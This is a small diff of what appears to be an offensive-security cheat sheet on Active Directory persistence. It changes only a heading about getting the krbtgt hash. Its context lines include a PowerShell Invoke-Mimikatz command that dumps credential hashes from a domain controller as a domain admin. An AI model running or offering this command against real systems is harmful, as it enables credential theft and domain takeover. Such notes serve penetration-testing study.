@@ -1,6 +1,6 @@
 ## Persistence on Active Directory 
 
-### Get `krbtgt` has
+### **Get `krbtgt` Hash**
 ```powershell
 # On DC as a DA
 C:> Invoke-Mimikatz -Command '"lsadump:lsa /patch"'
